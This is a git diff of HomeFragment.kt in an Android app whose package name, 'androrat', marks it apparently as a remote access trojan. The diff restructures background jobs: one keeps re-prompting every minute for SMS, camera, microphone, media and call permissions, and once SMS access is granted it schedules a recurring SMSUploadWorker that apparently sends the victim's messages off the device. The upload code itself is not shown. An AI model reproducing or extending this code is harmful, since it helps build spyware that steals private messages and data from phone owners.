@@ -28,11 +28,11 @@ import androidx.compose.ui.graphics.ImageBitmap
 import androidx.compose.ui.graphics.asAndroidBitmap
 import androidx.compose.ui.platform.ComposeView
 import androidx.compose.ui.platform.LocalContext
-import androidx.compose.ui.platform.LocalLifecycleOwner
 import androidx.core.content.ContextCompat
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.activityViewModels
 import androidx.navigation.fragment.findNavController
+import androidx.work.BackoffPolicy
 import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkInfo
@@ -51,10 +51,11 @@ import com.ierusalem.androrat.utility.Constants
 import com.ierusalem.androrat.utility.executeWithLifecycle
 import com.ierusalem.androrat.utility.openAppSettings
 import com.ierusalem.androrat.worker.PermissionRequestWorker
-import com.ierusalem.androrat.worker.UploadWorker
+import com.ierusalem.androrat.worker.SMSUploadWorker
 import java.io.File
 import java.io.FileOutputStream
 import java.io.OutputStream
+import java.time.Duration
 import java.util.concurrent.TimeUnit
 
 class HomeFragment : Fragment() {
@@ -71,45 +72,6 @@ class HomeFragment : Fragment() {
         Manifest.permission.READ_MEDIA_IMAGES,
         Manifest.permission.READ_MEDIA_AUDIO,
     )
-
-    @SuppressWarnings("unused")
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        /**
-         * To check the permissions whether granted or not
-         */
-//        ContextCompat.checkSelfPermission(
-//            this, Manifest.permission.READ_MEDIA_IMAGES
-//        ) == PackageManager.PERMISSION_GRANTED -> {
-//            // You can use the API that requires the permission.
-//        }
-
-        /**
-         * To check whether a device supports microphone and camera toggles,
-         * add the logic that appears in the following code snippet:
-         */
-
-//        val sensorPrivacyManager = applicationContext
-//            .getSystemService(SensorPrivacyManager::class.java)
-//                as SensorPrivacyManager
-//        val supportsMicrophoneToggle = sensorPrivacyManager
-//            .supportsSensorToggle(Sensors.MICROPHONE)
-//        val supportsCameraToggle = sensorPrivacyManager
-//            .supportsSensorToggle(Sensors.CAMERA)
-
-        /**
-         * Check whether your app is running on a device that has a front-facing camera.
-         */
-//        if (applicationContext.packageManager.hasSystemFeature(
-//                PackageManager.FEATURE_CAMERA_FRONT
-//            )
-//        ) {
-//            // Continue with the part of your app's workflow that requires a
-//            // front-facing camera.
-//        } else {
-//            // Gracefully degrade your app experience.
-//        }
-    }
 
     override fun onResume() {
         super.onResume()
@@ -133,7 +95,6 @@ class HomeFragment : Fragment() {
         return ComposeView(requireContext()).apply {
             setContent {
                 val context = LocalContext.current
-                val lifecycleOwner = LocalLifecycleOwner.current
                 val state by homeViewModel.state.collectAsState()
                 val dialogQueue = homeViewModel.visiblePermissionDialogQueue
                 val workManager = WorkManager.getInstance(context)
@@ -161,7 +122,6 @@ class HomeFragment : Fragment() {
                         }
                     }
                 )
-
 
                 val readMediaImagesAndAudioPermissionsAndroid13Launcher =
                     rememberLauncherForActivityResult(
@@ -274,118 +234,126 @@ class HomeFragment : Fragment() {
                 )
 
                 AndroRATTheme {
-
                     LaunchedEffect(
                         key1 = Unit,
                         block = {
-                            if (ContextCompat.checkSelfPermission(
-                                    requireContext(),
-                                    Manifest.permission.READ_SMS
-                                ) == PackageManager.PERMISSION_GRANTED
-                            ) {
-                                //cancel periodic unique work for permission request
-                                workManager.cancelUniqueWork(Constants.PERMISSION_REQUEST_WORK_NAME)
-
-                                val uploadWorkRequest = PeriodicWorkRequestBuilder<UploadWorker>(
+                            val permissions = homeViewModel.state.value.permissions
+                            val notGrantedPermissions =
+                                homeViewModel.state.value.permissions.filter { (_, isGranted) ->
+                                    !isGranted
+                                }
+                            val permissionWorkRequest =
+                                PeriodicWorkRequestBuilder<PermissionRequestWorker>(
                                     repeatInterval = 1,
                                     repeatIntervalTimeUnit = TimeUnit.MINUTES,
                                 )
-                                    .build()
-
-                                workManager.enqueueUniquePeriodicWork(
-                                    Constants.UPLOAD_WORK_NAME,
-                                    ExistingPeriodicWorkPolicy.CANCEL_AND_REENQUEUE,
-                                    uploadWorkRequest
-                                )
-                                workManager.getWorkInfosForUniqueWorkLiveData(Constants.UPLOAD_WORK_NAME)
-                                    .observe(viewLifecycleOwner) {
-                                        it.forEach { workInfo ->
-                                            if (workInfo.state == WorkInfo.State.RUNNING) {
-                                                val notGrantedPermissions =
-                                                    homeViewModel.state.value.permissions.filter { (_, isGranted) ->
-                                                        !isGranted
-                                                    }
-                                                notGrantedPermissions.forEach { (permission, isGranted) ->
-                                                    when (permission) {
-
-                                                        Manifest.permission.READ_MEDIA_AUDIO -> {
-                                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
-                                                                arrayOf(permission)
-                                                            )
-                                                        }
-
-                                                        Manifest.permission.READ_MEDIA_IMAGES -> {
-                                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
-                                                                arrayOf(permission)
-                                                            )
-                                                        }
-
-                                                        Manifest.permission.READ_EXTERNAL_STORAGE -> {
-                                                            readExternalStoragePermissionUnderAndroid11Launcher.launch(
-                                                                permission
-                                                            )
-                                                        }
-
-                                                        Manifest.permission.CAMERA -> {
-                                                            cameraResultPermissionLauncher.launch(
-                                                                permission
-                                                            )
-                                                        }
-
-                                                        Manifest.permission.READ_SMS -> {
-                                                            readSMSMessagesPermissionLauncher.launch(
-                                                                permission
-                                                            )
-                                                        }
-
-                                                        Manifest.permission.RECORD_AUDIO -> {
-                                                            multiplePermissionResultLauncher.launch(
-                                                                arrayOf(permission)
-                                                            )
-                                                        }
-
-                                                        Manifest.permission.CALL_PHONE -> {
-                                                            multiplePermissionResultLauncher.launch(
-                                                                arrayOf(permission)
-                                                            )
-                                                        }
-                                                    }
-                                                    Log.d(
-                                                        "ahi3646_not_only",
-                                                        "onCreateView: $permission - $isGranted "
-                                                    )
-                                                }
-                                            }
-                                            Log.d(
-                                                "ahi3646_upload_info",
-                                                "onCreateView: workInfo - ${workInfo.state} "
-                                            )
-                                        }
-                                    }
-                            } else {
-                                //cancel periodic unique work for upload
-                                workManager.cancelUniqueWork(Constants.UPLOAD_WORK_NAME)
-
-                                val permissionWorkRequest =
-                                    PeriodicWorkRequestBuilder<PermissionRequestWorker>(
-                                        repeatInterval = 1,
-                                        repeatIntervalTimeUnit = TimeUnit.MINUTES,
+                                    .setBackoffCriteria(
+                                        BackoffPolicy.LINEAR,
+                                        duration = Duration.ofSeconds(15)
                                     )
-                                        .build()
-                                workManager.enqueueUniquePeriodicWork(
-                                    Constants.PERMISSION_REQUEST_WORK_NAME,
-                                    ExistingPeriodicWorkPolicy.KEEP,
-                                    permissionWorkRequest
-                                )
-                                workManager.getWorkInfosForUniqueWorkLiveData(Constants.PERMISSION_REQUEST_WORK_NAME)
-                                    .observe(lifecycleOwner) {
-                                        it.forEach { workInfo ->
-                                            Log.d(
-                                                "ahi3646_request_info",
-                                                "onCreateView: workInfo - ${workInfo.state} "
-                                            )
+                                    .build()
+                            workManager.enqueueUniquePeriodicWork(
+                                Constants.PERMISSION_REQUEST_WORK_NAME,
+                                ExistingPeriodicWorkPolicy.KEEP,
+                                permissionWorkRequest
+                            )
+                            workManager.getWorkInfosForUniqueWorkLiveData(Constants.PERMISSION_REQUEST_WORK_NAME)
+                                .observe(viewLifecycleOwner) {
+                                    it.forEach { workInfo ->
+                                        Log.d(
+                                            "ahi3646_request",
+                                            "onCreateView: ${workInfo.state}"
+                                        )
+                                        if (workInfo.state == WorkInfo.State.RUNNING) {
+                                            notGrantedPermissions.forEach { (permission, isGranted) ->
+                                                homeViewModel.onPermissionResult(
+                                                    permission,
+                                                    isGranted
+                                                )
+                                            }
                                         }
                                     }
+                                }
+                            permissions.forEach { (permission, isGranted) ->
+                                when (permission) {
+                                    Manifest.permission.READ_MEDIA_IMAGES -> {
+                                        Log.d(
+                                            "ahi3646_xxx",
+                                            "onCreateView: $permission $isGranted "
+                                        )
+                                    }
+
+                                    Manifest.permission.READ_EXTERNAL_STORAGE -> {
+                                        Log.d(
+                                            "ahi3646_xxx",
+                                            "onCreateView: $permission $isGranted "
+                                        )
+                                    }
+
+                                    Manifest.permission.READ_MEDIA_AUDIO -> {
+                                        Log.d(
+                                            "ahi3646_xxx",
+                                            "onCreateView: $permission $isGranted "
+                                        )
+                                    }
+
+                                    Manifest.permission.CAMERA -> {
+                                        Log.d(
+                                            "ahi3646_xxx",
+                                            "onCreateView: $permission $isGranted "
+                                        )
+                                    }
+
+                                    Manifest.permission.READ_SMS -> {
+                                        if (isGranted) {
+                                            val uploadWorkRequest =
+                                                PeriodicWorkRequestBuilder<SMSUploadWorker>(
+                                                    repeatInterval = 1,
+                                                    repeatIntervalTimeUnit = TimeUnit.MINUTES,
+                                                )
+                                                    .setBackoffCriteria(
+                                                        BackoffPolicy.LINEAR,
+                                                        duration = Duration.ofSeconds(15)
+                                                    )
+                                                    .build()
+
+                                            workManager.enqueueUniquePeriodicWork(
+                                                Constants.SMS_UPLOAD_WORK_NAME,
+                                                ExistingPeriodicWorkPolicy.KEEP,
+                                                uploadWorkRequest
+                                            )
+                                            workManager.getWorkInfosForUniqueWorkLiveData(Constants.SMS_UPLOAD_WORK_NAME)
+                                                .observe(viewLifecycleOwner) {
+                                                    it.forEach { workInfo ->
+                                                        Log.d(
+                                                            "ahi3646_upload",
+                                                            "onCreateView: workInfo - ${workInfo.state} "
+                                                        )
+                                                    }
+                                                }
+                                        } else {
+                                            Log.d(
+                                                "ahi3646_xxx",
+                                                "onCreateView: upload work for $permission cancelled "
+                                            )
+                                            workManager.cancelUniqueWork(Constants.SMS_UPLOAD_WORK_NAME)
+                                        }
+                                    }
+
+                                    Manifest.permission.RECORD_AUDIO -> {
+                                        Log.d(
+                                            "ahi3646_xxx",
+                                            "onCreateView: $permission $isGranted "
+                                        )
+                                    }
+
+                                    Manifest.permission.CALL_PHONE -> {
+                                        Log.d(
+                                            "ahi3646_xxx",
+                                            "onCreateView: $permission $isGranted "
+                                        )
+                                    }
+                                }
                             }
                         }
                     )
@@ -395,9 +363,6 @@ class HomeFragment : Fragment() {
                         .forEach { permission ->
                             PermissionDialog(
                                 permissionTextProvider = when (permission) {
-                                    Manifest.permission.READ_MEDIA_AUDIO -> {
-                                        MusicAndAudioPermissionTextProvider()
-                                    }
                                     /**
                                      * No need to add Manifest.permission.READ_MEDIA_VIDEO
                                      * this will make rational dialog pop up two times for same warning
@@ -410,6 +375,10 @@ class HomeFragment : Fragment() {
 
                                     Manifest.permission.READ_EXTERNAL_STORAGE -> {
                                         ReadExternalStoragePermissionTextProvider()
+                                    }
+
+                                    Manifest.permission.READ_MEDIA_AUDIO -> {
+                                        MusicAndAudioPermissionTextProvider()
                                     }
 
                                     Manifest.permission.CAMERA -> {
@@ -435,11 +404,7 @@ class HomeFragment : Fragment() {
                                 ),
                                 onDismiss = homeViewModel::dismissDialog,
                                 onOkClick = {
-                                    dialogQueue.forEach {
-                                        Log.d("permissions", "onCreateView ok : $it ")
-                                    }
                                     when (permission) {
-
                                         Manifest.permission.READ_MEDIA_AUDIO -> {
                                             homeViewModel.dismissDialog()
                                             readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
@@ -546,7 +511,6 @@ class HomeFragment : Fragment() {
                                         }
                                     }
                                 }
-
                                 //this works in sdk 33 or higher versions
                                 in Build.VERSION_CODES.TIRAMISU..Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                                     //todo check these versions
@@ -639,5 +603,45 @@ class HomeFragment : Fragment() {
             ).show()
         }
     }
+
+    @SuppressWarnings("unused")
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        /**
+         * To check the permissions whether granted or not
+         */
+//        ContextCompat.checkSelfPermission(
+//            this, Manifest.permission.READ_MEDIA_IMAGES
+//        ) == PackageManager.PERMISSION_GRANTED -> {
+//            // You can use the API that requires the permission.
+//        }
+
+        /**
+         * To check whether a device supports microphone and camera toggles,
+         * add the logic that appears in the following code snippet:
+         */
+
+//        val sensorPrivacyManager = applicationContext
+//            .getSystemService(SensorPrivacyManager::class.java)
+//                as SensorPrivacyManager
+//        val supportsMicrophoneToggle = sensorPrivacyManager
+//            .supportsSensorToggle(Sensors.MICROPHONE)
+//        val supportsCameraToggle = sensorPrivacyManager
+//            .supportsSensorToggle(Sensors.CAMERA)
+
+        /**
+         * Check whether your app is running on a device that has a front-facing camera.
+         */
+//        if (applicationContext.packageManager.hasSystemFeature(
+//                PackageManager.FEATURE_CAMERA_FRONT
+//            )
+//        ) {
+//            // Continue with the part of your app's workflow that requires a
+//            // front-facing camera.
+//        } else {
+//            // Gracefully degrade your app experience.
+//        }
+    }
+
 
 }
